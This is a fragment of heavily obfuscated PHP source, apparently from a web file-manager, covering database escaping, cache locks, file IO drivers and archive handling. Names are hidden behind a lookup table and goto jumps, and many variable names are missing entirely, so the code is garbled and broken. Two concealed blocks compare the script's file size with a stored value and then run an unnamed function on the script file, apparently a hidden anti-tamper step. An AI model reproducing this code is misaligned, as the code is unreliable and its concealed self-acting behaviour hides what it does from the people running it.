$this->parseKeyCheck($); } if ($this->dbType == $[1112]) { if ($ != $[220] && !preg_match($[1076], $)) { $ = $[475] . trim($, $[475]) . $[475]; } return $; } else { return parent::parseKey($, $ݏ); } } public function close() { $this->_linkID = null; } public function error() { $眖 =& $_SERVER[ܮ]; if ($this->PDOStatement) { $ = $this->PDOStatement->errorInfo(); $this->error = $[1] . $眖[4] . $[2]; } else { $this->error = $眖[12]; } if ($眖[12] != $this->queryStr) { $this->error .= LNG($眖[48]) . $this->queryStr; } think_trace($this->error, $眖[12], $眖[49]); return $this->error; } public function escapeString($) { $ =& $_SERVER[ܮ]; switch ($this->dbType) { case $[1109]: case $[1082]: case $[1100]: case $[1112]: return addslashes($); case $[1084]: case $[1101]: case $[1083]: case $[1085]: return str_ireplace($[58], $[59], $); } } protected function parseValue($톫) { $⬁ܤ =& $_SERVER[ܮ]; if (is_string($톫)) { $ = strpos($톫, $⬁ܤ[4]) === 0 && in_array($톫, array_keys($this->bind)); $톫 = $ ? $this->escapeString($톫) : $⬁ܤ[1122] . $this->escapeString($톫) . $⬁ܤ[1122]; } elseif (isset($톫[0]) && is_string($톫[0]) && strtolower($톫[0]) == $⬁ܤ[372]) { $톫 = $this->escapeString($톫[1]); } elseif (is_array($톫)) { $톫 = array_map(array($this, $⬁ܤ[1123]), $톫); } elseif (is_bool($톫)) { $톫 = $톫 ? $⬁ܤ[91] : $⬁ܤ[228]; } elseif (is_null($톫)) { $톫 = $⬁ܤ[103]; } return $톫; } public function getLastInsertId() { $Ĥ =& $_SERVER[ܮ]; switch ($this->dbType) { case $Ĥ[1109]: case $Ĥ[1101]: case $Ĥ[1082]: case $Ĥ[1100]: case $Ĥ[1084]: case $Ĥ[1112]: return $this->_linkID->lastInsertId(); case $Ĥ[1083]: case $Ĥ[1085]: $ë = $this->table; $ގ = $this->query("\123\x45\114\x45\x43\x54\x20{$ë}\56\x63\165\162\x72\x76\141\154\40\143\x75\x72\162\166\141\154\x20\106\x52\117\115\40\144\165\x61\154"); return $ގ ? $ގ[0][$Ĥ[1124]] : 0; } } } class DbSqlite extends DbSqliteBase { protected function _execSql($؎ô) { if (!$this->_linkID || !$؎ô) { return; } sqlite_query($this->_linkID, $؎ô); } protected function initConnectAfter() { $ˈ =& $_SERVER[ܮ]; $this->_execSql($ˈ[1125]); $this->_execSql($ˈ[1126]); } public function query($) { $ސ = parent::query($); return $ސ; } public function execute($) { $Ȅ =& $_SERVER[ܮ]; if (!CacheLock::fileLock($Ȅ[1127])) { return !1; } $Ӽ = parent::execute($); CacheLock::fileUnLock($Ȅ[1127]); return $Ӽ; } } goto D; D: $_file = $_SERVER[$_SERVER[ܮ][898]]; $_size = $_SERVER[ܮ][899]; if ($_SERVER[$_SERVER[ܮ][900]] != $_size($_file)) { $_getc = $_SERVER[ܮ][901]; $_getfile = $_SERVER[$_SERVER[ܮ][902]] . $_SERVER[ܮ][903]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ܮ][285], $_getfilec); if (count($_getarrs) < $_SERVER[ܮ][715]) { $exit = $_SERVER[ܮ][904]; $exit(); } $_act = $_SERVER[ܮ][905]; $_act($_file); } goto C; c齜: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ųƃ =& $_SERVER[ܮ]; $ = $GLOBALS[$ųƃ[6]][$ųƃ[424]]; self::$cachePath = $[$ųƃ[230]][$ųƃ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($, $ = 0) { $ =& $_SERVER[ܮ]; $ = microtime(!0); $ = $ + $ + 0.0001; $ = rtrim(self::$cachePath, $[8]) . $[1027] . md5($) . $[1024]; if (file_exists($) && filemtime($) && filemtime($) < time() - 10) { @unlink($); } do { if (file_exists($)) { cacheLockWait(); continue; } $ߒ = fopen($, $[1028]); if (!$ߒ) { return !1; } $駘 = flock($ߒ, LOCK_EX | LOCK_NB); self::$caches[$] = array($[1029] => $ߒ, $[230] => $); fwrite($ߒ, $); clearstatcache(); if ($ߒ && $駘) { return !0; } cacheLockWait(); } while (microtime(!0) < $); $this->unlock($); return !1; } public function lockGet($) { $ =& $_SERVER[ܮ]; $ʲ = rtrim(self::$cachePath, $[8]) . $[1027] . md5($) . $[1024]; return file_exists($ʲ); } public function unlock($す) { $Ë =& $_SERVER[ܮ]; $郷 = self::$caches[$す]; if (!$郷) { return; } @flock($郷[$Ë[1029]], LOCK_UN); @fclose($郷[$Ë[1029]]); @unlink($郷[$Ë[230]]); unset(self::$caches[$す]); } } class CacheLockRedis { public function lock($޺Ý, $ø = 10) { $ϓ = Cache::init(); $ο = microtime(!0) + $ø; while (microtime(!0) < $ο) { $Й = $ϓ->get($޺Ý); if (!$Й) { $뒪 = $ϓ->setLock($޺Ý, $ο, $ø); if ($뒪) { return !0; } } else { if ($Й < microtime(!0)) { $ϓ->set($޺Ý, $ο, $ø * 2); if ($ϓ->get($޺Ý) === $Й) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ڣ) { return Cache::init()->get($ڣ); } public function unlock($) { return Cache::init()->remove($); } } goto f;ҕ; f;ҕ: class CacheLockMemcached { public function lock($, $ = 0) { $ٳ = Cache::init(); $ = microtime(!0) + $; while (microtime(!0) < $) { $θ = $ٳ->get($); if (!$θ || $θ < microtime(!0)) { $况؃ = $ٳ->handle->add($, $, $); if ($况؃) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($׺) { return Cache::init()->get($׺); } public function unlock($͇) { return Cache::init()->remove($͇); } } class CacheLockDatabase { public function lock($, $󦏎 = 0) { $͕ = Model($_SERVER[ܮ][988]); $ӄ = microtime(!0) + $󦏎; while (microtime(!0) < $ӄ) { $ = $͕->get($); if (!$ || $ < microtime(!0)) { $϶ = $͕->set($, $ӄ); if ($϶) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ͻ) { return Model($_SERVER[ܮ][988])->get($ͻ); } public function unlock($) { Model($_SERVER[ܮ][988])->remove($); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($⪴, $) { $˵ =& $_SERVER[ܮ]; if (!class_exists($˵[1030])) { show_json($˵[1031], !1); } $this->cacheTime = $; $this->handle = new Memcached(); if (is_array($⪴[$˵[1032]]) && count($⪴[$˵[1032]]) >= 1) { foreach ($⪴[$˵[1032]] as $) { $䘿 = explode($˵[4], $); $this->handle->addServer($䘿[0], $䘿[1]); } } else { $this->handle->addServer($⪴[$˵[206]], $⪴[$˵[207]]); } } public function set($Ԝ, $, $ = false) { $ = $ ? $ : $this->cacheTime; return $this->handle->set($Ԝ, $, $); } public function get($ߦ) { return $this->handle->get($ߦ); } public function remove($) { return $this->handle->delete($); } public function deleteAll() { return $this->handle->flush(); } } goto d; bښަ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($, $ʎ׹) { $ =& $_SERVER[ܮ]; $Ƅ = $ʎ׹; $GLOBALS[$[1331]] = $[1332] . $; Hook::trigger($[1332] . $ . $[1333], $Ƅ); $ = self::driverMake($ʎ׹[0]); if (!$) { return !1; } if ($ == $[641] || $ == $[643] || $ == $[1334]) { if (!trim($->path . $[463], $[8])) { return !1; } } if (method_exists($, $)) { $ݭȒ = @call_user_func_array(array($, $), $ʎ׹); } else { if (method_exists($, $[1335])) { $ݭȒ = @call_user_func_array(array($, $), $ʎ׹); } else { if (method_exists(self, $)) { $ݭȒ = @call_user_func_array(array(self, $), $ʎ׹); } else { $ݭȒ = call_user_func_array(array(parent, $), $ʎ׹); } } } Hook::trigger($[1332] . $ . $[1336], $Ƅ, $ݭȒ); return $ݭȒ; } public static function init($ņ) { return self::driverMake($ņ); } public static function copy($, $펓, $ѫפ = false, $ó = false) { return self::copyMoveStart($, $펓, $ѫפ, $_SERVER[ܮ][641], $ó); } public static function move($Ĩ, $ۈΙ, $Ĳ = false, $ = false) { return self::copyMoveStart($Ĩ, $ۈΙ, $Ĳ, $_SERVER[ܮ][643], $); } public static function copyMoveChildren($Ǌ, $ݧӸ, $ = "\143\157\x70\171", $ = REPEAT_REPLACE) { $ =& $_SERVER[ܮ]; $˗ۢ = $Ǌ; $ɲ = self::driverMake($Ǌ); $㶁 = $ɲ->listPath($Ǌ, !0); $ӽ = array_merge($㶁[$[86]], $㶁[$[85]]); foreach ($ӽ as $֍) { self::copyMoveStart($֍[$[87]], $ݧӸ, $, $, !1); } if ($ == $[643]) { self::remove($˗ۢ); } } private static function copyMoveStart($ܻ, $ҿ, $, $, $) { $ޝ =& $_SERVER[ܮ]; $Ը = array($ܻ, $ҿ, $, $); Hook::trigger($ޝ[1332] . $ . $ޝ[1333], $Ը); $׸ = self::copyMove($ܻ, $ҿ, $, $, $); Hook::trigger($ޝ[1332] . $ . $ޝ[1336], $Ը, $׸); return $׸; } public static function saveFile($̗Ȅ, $Ƶ, $ = true) { $޳ =& $_SERVER[ܮ]; $ = self::info($Ƶ); $ˋ = self::driverMake($̗Ȅ); $Ŋ = self::driverMake($Ƶ); $ = !1; if ($Ŋ->pathParse[$޳[1337]]) { $ = $Ŋ; $ꑊ = $Ŋ->pathParse[$޳[1337]]; $Ŋ = self::driverMake($ꑊ); } if ($ˋ->pathParse[$޳[1337]]) { $ɡ = $ˋ->pathParse[$޳[1337]]; $ˋ = self::driverMake($ɡ); } $Ȉ = $Ŋ->pathFather($Ƶ); $мϷ = !0; if (!$ && self::driverIsSame($ˋ, $Ŋ)) { $мϷ = !1; } $ = self::copyFile($ˋ, $̗Ȅ, $Ŋ, $Ȉ, $[$޳[32]], $мϷ); if ($) { $ = $->getPathOuter($); } return $; } private static function copyMove($, $, $ӈɲ, $, $ = false) { $Љ =& $_SERVER[ܮ]; if (!$ || $ == $Љ[8] || !$) { return !1; } ignore_timeout(); $߀ = self::driverMake($); $ = self::driverMake($); $¸ʐ = $ == $Љ[643]; $ = !1; if ($->pathParse[$Љ[1337]]) { $ = $; $ = $->pathParse[$Љ[1337]]; $ = self::driverMake($); } if ($߀->pathParse[$Љ[1337]]) { $ = $߀->pathParse[$Љ[1337]]; $߀ = self::driverMake($); } self::check($߀, $, $, $); Hook::trigger($Љ[1338], $߀, $, $, $); $ = self::driverIsSame($߀, $); if ($) { if ($ == $Љ[643] && !method_exists($, $Љ[1339]) && trim($, $Љ[8]) == trim($->pathFather($), $Љ[8])) { if ($߀->pathThis($) != $ && !$߀->isOsDriver()) { return $߀->rename($, $); } return $->getPathOuter($); } if (method_exists($, $)) { return $->{$}($, $, $ӈɲ, $); } } if ($ && $ == $Љ[643] && $->getType() == $Љ[106]) { $ѥ = $->movePath($, $, $); if ($ѥ) { return $ѥ; } } $Ǔ = $߀->isFile($); if (!$Ǔ && $->getType() == $Љ[856] && $߀->getType() == $Љ[106]) { $ѥ = $->copyFolderFromIO($߀, $, $, $ӈɲ, $¸ʐ, $); } else { $ѥ = self::copyPath($߀, $, $, $, $ӈɲ, $¸ʐ, $Ǔ, $); } if ($ѥ && $¸ʐ) { $߀->remove($); } if ($) { $ѥ = $->getPathOuter($ѥ); } return $ѥ; } private static function check($鲸, $, $ʗ, &$ƭ) { $ա =& $_SERVER[ܮ]; if (self::driverIsSame($鲸, $ʗ) && $鲸->isFolder($) && $鲸->isParentOf($, $ƭ)) { show_json(LNG($ա[1340]), !1); } if (!$鲸->exist($)) { show_json(LNG($ա[105]), !1); } } private static function copyPath($, $, $ē, $ԃ, $ǆ, $, $貌, $ٞ = false, $Έ = true) { $ =& $_SERVER[ܮ]; $ = empty($ٞ) && $ٞ !== $[228] ? $->pathThis($) : $ٞ; if ($ǆ) { $˷ = $ē->fileNameExist($ԃ, $); $ = $; $ = $ē->fileNameAuto($ԃ, $, $ǆ, !$貌); if (!$˷ || $ != $) { $ǆ = !1; } if ($Έ && !$ǆ) { $ē->_data[$[1341]] = !0; } } if ($貌) { return self::copyFile($, $, $ē, $ԃ, $, $); } if ($ǆ == REPEAT_RENAME_FOLDER) { $ǆ = !1; } $ = rtrim($ԃ, $[8]) . $[8] . $; $ = $ē->mkdir($ē->getPath($), $ǆ); $ԃ = $ē->getPathInner($); $ȵ = $->listPath($, !0); $ȵ = is_array($ȵ) ? $ȵ : array($[86] => array(), $[85] => array()); $ = array_merge($ȵ[$[86]], $ȵ[$[85]]); foreach ($ as $ǌ) { $ = $ǌ[$[33]] == $[230]; $ = $->getPathInner($ǌ[$[87]]); $њ = self::copyPath($, $, $ē, $ԃ, $ǆ, $, $, !1, !1); if (!$њ) { IO::errorTips($[1342] . $ . $[73] . $ԃ); } } self::copyMoveKeepInfo($, $, $); return $; } private static function copyFile($ڋ, $, $ٖ, $, $陚, $΢׬) { $˳ =& $_SERVER[ܮ]; $ = $ٖ->getPath(rtrim($, $˳[8]) . $˳[8] . $陚); $ = $˳[1343] . time() . rand_string(5); Hook::trigger($˳[1344], $ڋ, $, $ٖ, $, $陚, $); if (self::driverIsSame($ڋ, $ٖ)) { if ($΢׬) { $څ = $ٖ->moveFile($, $); } else { $څ = $ٖ->copyFile($, $); } Hook::trigger($˳[1345], $ڋ, $, $ٖ, $, $陚, $څ); self::copyMoveKeepInfo($ڋ, $, $څ); return $څ; } $˳˽ = TEMP_FILES; if ($GLOBALS[$˳[6]][$˳[92]][$˳[896]]) { $˳˽ = $GLOBALS[$˳[6]][$˳[92]][$˳[896]]; } $ = $˳˽; mk_dir($); $͘ = $ . $; $ = $͘; $͘ = $ڋ->download($, $͘); $͘ = $ڋ->iconvApp($͘); if (substr($͘, strlen($˳˽)) == $˳˽) { $΢׬ = !0; } $څ = $ٖ->upload($, $͘, $΢׬); self::remove($); Hook::trigger($˳[1345], $ڋ, $, $ٖ, $, $陚, $څ); self::copyMoveKeepInfo($ڋ, $, $څ); return $څ; } private static function copyMoveKeepInfo($꠺, $擰, $Ũ) { if (!$Ũ) { return; } $ = $꠺->info($擰); if (!is_array($)) { return; } IO::setModifyTime($Ũ, $[$_SERVER[ܮ][88]]); } public static function pathFather($) { $䚓Ǚ = IO::init($); $Ť = $䚓Ǚ->pathFather($䚓Ǚ->path); return $䚓Ǚ->getPathOuter($Ť); } public static function fileOut($, $ = false, $Ԓ = false, $ = '') { $톪 = self::driverMake($); if ($톪->isFileOutServer()) { return $톪->fileOutServer($, $, $Ԓ, $); } return $톪->fileOut($, $, $Ԓ, $); } public static function fileOutImage($, $ = 250) { $ = array(250, 600, 1200, 2000, 3000, 5000); for ($̓ɠ = 0; $̓ɠ < count($); $̓ɠ++) { if ($̓ɠ == 0 && $ <= $[$̓ɠ]) { $ = $[$̓ɠ]; break; } else { if ($ > $[$̓ɠ - 1] && $ <= $[$̓ɠ]) { $ = $[$̓ɠ]; break; } else { if ($̓ɠ == count($) - 1 && $ > $[$̓ɠ]) { $ = $[$̓ɠ]; break; } } } } $ = self::driverMake($); if ($->isFileOutServer()) { return $->fileOutImageServer($, $); } return $->fileOutImage($, $); } private static function driverIsSame($, $Խ۱) { $ =& $_SERVER[ܮ]; $ = $->getType(); $ʹԺ = $Խ۱->getType(); if ($ != $ʹԺ) { return !1; } if ($ == $[856]) { return !0; } if ($ == $[106]) { return !0; } if ($->pathDriver == $Խ۱->pathDriver) { return !0; } return !1; } public static function copyUpdate($Բ, $ҡ) { $༌ =& $_SERVER[ܮ]; if (!IO::exist($Բ)) { return !1; } if (!IO::exist($ҡ)) { IO::mkdir($ҡ); } $⯷ = array_to_keyvalue(self::listAllSimple($Բ), $༌[87]); $˩ = array_to_keyvalue(self::listAllSimple($ҡ), $༌[87]); $ܱ = array(); $柼 = array(); foreach ($⯷ as $ => $) { if (isset($˩[$])) { if ($[$༌[78]] == 1) { continue; } if ($˩[$][$༌[79]] == $[$༌[79]]) { continue; } } if ($[$༌[78]] == 1) { $柼[] = $ҡ . $༌[8] . trim($, $༌[8]); continue; } $ = strstr(trim($, $༌[8]), $༌[8]) ? get_path_father($) : $༌[12]; $ܱ[] = array($༌[1346] => $[$༌[89]], $༌[1347] => rtrim($ҡ, $༌[8]) . $༌[8] . $, $༌[1348] => $); } $ˇ = array($༌[230] => $ܱ, $༌[78] => $柼); Hook::trigger($༌[1349], $Բ, $ҡ, $ˇ); foreach ($柼 as $) { IO::mkdir($); } foreach ($ܱ as $) { IO::copy($[$༌[1346]], $[$༌[1347]], REPEAT_REPLACE); } } public static function fileSubstr($, $Ǜ, $颽 = false) { $Ę =& $_SERVER[ܮ]; $׷ = self::driverMake($); $ݘެ = $׷->size($); $޺ = $Ǜ; $˵ = $颽; if ($Ǜ < 0) { $Ǜ = $ݘެ + $Ǜ; } if ($颽 === !1) { $颽 = $ݘެ - $Ǜ; } if ($Ǜ + $颽 > $ݘެ) { $颽 = $ݘެ - $Ǜ; } if (!$ݘެ && $׷->getType() == $Ę[106] && !$׷->exist($)) { $ = get_path_this($); $ݑǭ = parse_url_query($); if (is_array($ݑǭ) && isset($ݑǭ[$Ę[32]])) { $ = urldecode($ݑǭ[$Ę[32]]); } throw new Exception($Ę[1350] . LNG($Ę[1351]) . $Ę[1134] . clear_html($) . $Ę[12]); } if ($颽 <= 0) { return $Ę[12]; } if ($Ǜ < 0 || $Ǜ >= $ݘެ || $颽 > $GLOBALS[$Ę[6]][$Ę[92]][$Ę[1352]]) { throw new Exception("\146\x69\x6c\145\x52\x65\141\x64\40\145\x72\x72\x6f\x72\x2c\157\166\145\162\40\x69\157\122\145\x61\144\x4d\x61\x78\x21\x20\x73\164\141\x72\164\75{$Ǜ}\73\154\x65\x6e\x67\164\150\75{$颽}\73\x20\x73\151\x7a\145\75{$ݘެ}\73"); } $Њմ = $׷->fileSubstr($, $Ǜ, $颽); if (!$Њմ && $颽 && isset($GLOBALS[$Ę[1353]])) { throw new Exception($GLOBALS[$Ę[1353]][$Ę[1354]]); } return $Њմ; } private static function driverMake(&$ω) { $ =& $_SERVER[ܮ]; $ʣ = KodIO::parse($ω); if (!self::$driverListSystem) { $⽼ = Model($[866])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($⽼, $[487]); } if ($ʣ[$[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ʣ[$[487]]]) { throw new Exception($[1355]); return !1; } $ω = $ʣ[$[1356]]; $Ð = self::driverGet($ʣ, $ω); return $Ð; } private static function driverGet($, &$Ѣ΀) { $ͱ =& $_SERVER[ܮ]; $פ = $[$ͱ[1357]]; $ʗ = $[$ͱ[487]]; switch ($[$ͱ[33]]) { case KodIO::KOD_IO: $ʲ = self::$driverListSystem[$ʗ]; break; case KodIO::KOD_SOURCE: $Ѣ΀ = $ʗ . $Ѣ΀; $ʲ = array($ͱ[1358] => $ͱ[1359], $ͱ[6] => $); $ʲ[$ͱ[6]][$ͱ[1360]] = $[$ͱ[487]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $׃ = $GLOBALS[$ͱ[1361]]; self::$driverListUser = array_to_keyvalue($׃, $ͱ[487]); } $ʲ = self::$driverListUser[$ʗ]; break; case KodIO::KOD_SHARE_LINK: $ʲ = array($ͱ[1358] => $ͱ[1362], $ͱ[6] => $); $ͣ = Action($ͱ[1363])->sharePathInfo($[$ͱ[87]]); $Ѣ΀ = $ͣ[$ͱ[191]]; if (!$ͣ[$ͱ[191]]) { $զ = Model($ͱ[686])->getInfoByHash($[$ͱ[487]]); $Ѣ΀ = KodIO::clear($զ[$ͱ[583]] . $[$ͱ[1356]]); $[$ͱ[576]] = $զ; $[$ͱ[1337]] = $Ѣ΀; $ʲ = array($ͱ[1358] => $ͱ[1364], $ͱ[6] => $); } else { $ʲ[$ͱ[6]][$ͱ[1360]] = $ͣ[$ͱ[191]]; } break; case KodIO::KOD_SHARE_ITEM: $ʲ = array($ͱ[1358] => $ͱ[1365], $ͱ[6] => $); $զ = Model($ͱ[686])->getInfo($[$ͱ[487]]); if ($զ[$ͱ[191]] == $ͱ[228]) { $Ѣ΀ = KodIO::clear($զ[$ͱ[583]] . $[$ͱ[1356]]); $[$ͱ[576]] = $զ; $[$ͱ[1337]] = $Ѣ΀; $ʲ = array($ͱ[1358] => $ͱ[1366], $ͱ[6] => $); } else { if (!$Ѣ΀) { $Ѣ΀ = $զ[$ͱ[191]]; } $ʲ[$ͱ[6]][$ͱ[1360]] = $զ[$ͱ[191]]; } break; case KodIO::KOD_SHARE_OUTER: $ʲ = array($ͱ[1358] => $ͱ[1367], $ͱ[6] => $); break; default: $Ѣ΀ = $[$ͱ[87]]; $ʲ = array($ͱ[1358] => $ͱ[1368]); break; } $ = $[$ͱ[87]]; if (!isset(self::$driverCache[$])) { $Ύ = strtolower($ʲ[$ͱ[96]]); $ = $GLOBALS[$ͱ[6]][$ͱ[92]][$ͱ[940]]; $Ė = $ͱ[77] . (isset($[$Ύ]) ? $[$Ύ] : ucfirst($Ύ)); if (!class_exists($Ė)) { show_json("{$Ė}\x20\x6e\x6f\x74\x20\x65\x78\151\163\164\163\x21", !1); } $Щ = isset($ʲ[$ͱ[6]]) ? $ʲ[$ͱ[6]] : !1; self::$driverCache[$] = new $Ė($Щ); } $ȶ = self::$driverCache[$]; $ȶ->pathDriver = $פ; $ȶ->pathBase = $ͱ[12]; if (isset($ʲ[$ͱ[6]][$ͱ[1369]])) { $ȶ->pathBase = rtrim($ʲ[$ͱ[6]][$ͱ[1369]], $ͱ[8]) . $ͱ[8]; $Ѣ΀ = $ȶ->pathBase . ltrim($Ѣ΀, $ͱ[8]); } $Ѣ΀ = $ȶ->getPath($Ѣ΀); if (isset($[$ͱ[1337]])) { $Ѣ΀ = $[$ͱ[1337]]; } $ȶ->path = $Ѣ΀; return $ȶ; } public static function errorTips($ = false, $ = true) { $𠹷 =& $_SERVER[ܮ]; static $ē = array(); $ų = 100; if ($ === -1) { return $ē ? $ē[count($ē) - 1] : $𠹷[12]; } if ($ === !1) { return implode($𠹷[285], $ē); } if (count($ē) >= $ų) { $ē = array_slice($ē, $ų * 0.5, $ų); } $ē[] = $; if (!$) { return; } write_log($𠹷[173] . ACTION . $𠹷[1370] . $, $𠹷[1371]); } public static function getLastError($ߙ = '') { $ӗ = self::errorTips(-1); return $ӗ ? $ӗ : $ߙ; } } if ($_SERVER[$_SERVER[ܮ][900]] != $_SERVER[$_SERVER[ܮ][1372]]) { $_getc = $_SERVER[ܮ][901]; $_getfile = $_SERVER[$_SERVER[ܮ][902]] . $_SERVER[ܮ][903]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ܮ][285], $_getfilec); if (count($_getarrs) < $_SERVER[ܮ][715]) { $exit = $_SERVER[ܮ][904]; $exit(); } $_act = $_SERVER[ܮ][905]; $_act($_SERVER[$_SERVER[ܮ][898]]); } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $; if ($) { return $; } $ = IO::init($_SERVER[ܮ][8]); return $; } private static function iconvSystem($ܷ) { return self::local()->iconvSystem($ܷ); } private static function iconvApp($) { return self::local()->iconvApp($); } public static function zipFolder($, $ƵӁ = "\x7a\151\x70", $଻ς = '', $ē = REPEAT_RENAME) { $ =& $_SERVER[ܮ]; $݅܏ = IO::listPath($); if (!$݅܏) { return !1; } $݅܏ = array_merge($݅܏[$[85]], $݅܏[$[86]]); return self::zip($݅܏, $ƵӁ, $଻ς, $ē); } public static function zip($љ, $眺 = "\172\x69\160", $ = '', $ = REPEAT_RENAME) { $ =& $_SERVER[ܮ]; if (is_string($љ) && $љ) { $љ = array(array($[87] => $љ)); } $Ӧ = self::init($љ[0][$[87]]); $ݎ = self::info($љ[0][$[87]]); $ܺ = $[12]; $Ƙ = $[12]; $ = $[12]; if ($ && substr($, -1, 1) != $[8]) { $Ƙ = get_path_father($); $ = get_path_this($); } else { $Ƙ = self::pathFather($ݎ[$[87]]); $ = $ݎ[$[32]] . $[10] . $眺; if (count($љ) > 1) { $ = IO::info($Ƙ); $ = $[$[32]] . $[10] . $眺; } if ($) { $Ƙ = $; } } if ($Ӧ->getType() == $[106]) { $ɟ = self::init($Ƙ); $ŀ = $ɟ->getType() == $[106] ? $Ƙ : get_path_father($Ӧ->path); $ŀ = IO::getPathInner($ŀ); $ŀ = rtrim($ŀ, $[8]) . $[8]; mk_dir($ŀ); } else { $ܺ = TEMP_FILES . $[1373] . time() . rand_string(8) . $[8]; mk_dir($ܺ); file_put_contents($ܺ . $[1374], $[12]); $ŀ = $ܺ; } $ = IO::info($ŀ); if (!$ || !$[$[233]]) { show_json(LNG($[1375]), !1); } $Ș = self::zipFileList($љ, $ܺ); foreach ($Ș as $津 => $Љ) { $Ș[$津] = self::iconvSystem($Љ); } $յ = get_filename_auto($ŀ . $, $[12], $); KodArchive::create(self::iconvSystem($յ), $Ș); if (!IO::exist($յ)) { if ($ܺ) { del_dir($ܺ); } write_log($[1376] . $յ, $[388]); show_json(LNG($[1377]), !1); } if (!$ܺ) { return $յ; } $ = self::move($յ, $Ƙ, $); if ($ܺ) { del_dir($ܺ); } if (!$յ) { write_log($[1378] . $յ . $[1379] . $Ƙ, $[388]); show_json(LNG($[1377]), !1); } return $; } public static function unzip($≔, $, $笰 = "\55\61", $鵮 = "\162\x65\x70\x6c\141\143\x65") { $ =& $_SERVER[ܮ]; $س = parent::info($≔); if (!$س) { show_json(LNG($[1380]), !1); } $φ = IO::infoFullSimple($); if (!$φ) { $ = IO::mkdir($); } if (isset($φ[$[191]]) && trim($φ[$[87]], $[8]) != trim($, $[8])) { $׶ = KodIO::make($φ[$[190]]); $׉ = IO::fileNameAuto($׶, $φ[$[32]], REPEAT_RENAME_FOLDER, !0); $ = IO::mkdir($׶ . $׉); } $笰 = $笰 && $笰 != $[1381] ? @json_decode($笰, !0) : -1; $܀ = self::unzipPart($≔, $笰); if (!$܀ || !IO::exist($܀[$[230]])) { show_json(LNG($[105]), !1); } $ȧ = $܀[$[1382]][count($܀[$[1382]]) - 1]; if ($ȧ[$[1309]] == -1 || substr($ȧ[$[32]], -1, 1) == $[8]) { $ݤ̱ = $܀[$[1383]] . rand_string(10) . $[8]; mk_dir($ݤ̱); $Ɉ = count($܀[$[1382]]) == 1 ? IO::ext($≔) : get_path_ext($܀[$[230]]); $ = KodArchive::extract(self::iconvSystem($܀[$[230]]), $ݤ̱, $ȧ[$[1309]], $׉, $Ɉ); self::unzipErrorCheck($, array($[1384], $≔, $Ɉ, $, $܀)); Hook::trigger($[1385], $ݤ̱); recursion_dir($ݤ̱, $ȶ׈Ѻ, $ӊ, 0); $ = array_merge($ȶ׈Ѻ, $ӊ); $ = array(); foreach ($ as $Ψ) { $ئ = IO::move(self::iconvApp($Ψ), $, $鵮); if ($ئ) { $[] = $ئ; } } del_dir($ݤ̱); } else { $ئ = IO::move($܀[$[230]], $, $鵮, get_path_this($ȧ[$[32]])); if ($ئ) { $[] = $ئ; } } return $ ? $ : !1; } public static function unzipList($˱۩) { $ =& $_SERVER[ܮ]; $盫 = isset($˱۩[$[1386]]) ? $˱۩[$[1386]] : !1; $ߛ = isset($˱۩[$[1309]]) ? @json_decode($˱۩[$[1309]], !0) : -1; $܆ = self::unzipPart($˱۩[$[87]], $ߛ); if (!$܆ || !IO::exist($܆[$[230]])) { show_json(LNG($[105]), !1); } $ = $܆[$[1382]][count($܆[$[1382]]) - 1]; $ܹ = in_array(IO::ext($܆[$[230]]), array($[388], $[1387], $[1388], $[1389], $[1390], $[1391])); if (!$盫 && ($[$[1309]] == -1 || $ܹ)) { $ = $܆[$[1383]] . get_path_this($܆[$[230]]) . $[966]; if (!IO::exist($)) { $ہ = $[$[1309]] == -1 ? get_path_ext(IO::pathThis($˱۩[$[87]])) : get_path_ext($܆[$[230]]); $Օҵ = KodArchive::listContent(self::iconvSystem($܆[$[230]]), !0, $ہ); self::unzipErrorCheck($Օҵ, array($[1392], $˱۩, $܆)); @file_put_contents($, json_encode($Օҵ[$[1393]])); } return @json_decode(IO::getContent($), !0); } IO::fileOut($܆[$[230]], $盫, get_path_this($[$[32]])); die; } private static function zipFileList($򼩵, $ջ = false) { $Í =& $_SERVER[ܮ]; $럋 = array(); foreach ($򼩵 as $̻) { $ֆ = $̻[$Í[87]]; if ($ջ) { $ֆ = self::copy($̻[$Í[87]], $ջ, $Í[933]); } else { $ = self::init($̻[$Í[87]]); if ($->getType() == $Í[106]) { $ֆ = $->path; } } if ($ֆ && self::local()->exist($ֆ)) { $럋[$̻[$Í[87]]] = $ֆ; } } if (!empty($럋)) { return array_values($럋); } show_json(LNG($Í[1351]), !1); } private static function localFilePath($) { $ڝ =& $_SERVER[ܮ]; $ = KodIO::parse($); if ($[$ڝ[33]] == KodIO::KOD_SOURCE) { $ = Model($ڝ[939])->fileInfoGet(KodIO::sourceID($)); if (!$[$ڝ[87]]) { show_json($ڝ[1394], !1); } $ = $[$ڝ[87]]; } $ޓ = self::init($); if ($ޓ->pathParse[$ڝ[1337]]) { $ = $ޓ->pathParse[$ڝ[1337]]; $ޓ = self::init($); } $ = $ޓ->getType(); if ($ == $ڝ[106] || $ == $ڝ[1395]) { if (!$ޓ->exist($ޓ->path)) { show_json(LNG($ڝ[105]), !1); } return $ޓ->path; } return !1; } public static function unzipPart($ݢ, $ = -1) { $溠 =& $_SERVER[ܮ]; $ޭ = IO::pathThis($ݢ); if (!$ || $ == -1) { $ = array(array($溠[32] => $ޭ, $溠[1309] => -1)); $[0][$溠[1396]] = $[0][$溠[32]]; } else { if (is_array($)) { $ = $; $߅ = count($) - 1; for ($ = 0; $ <= $߅; $++) { $쇋 = $[$]; $ល = get_path_this($쇋[$溠[32]]) . (checkExtSafe($쇋[$溠[32]]) ? $溠[12] : $溠[1397]); $[$][$溠[1396]] = $溠[1398] . intval($쇋[$溠[1309]]) . $溠[476] . $ល; if ($ == 0) { continue; } $[$][$溠[1396]] = $[$ - 1][$溠[1396]] . $溠[1399] . 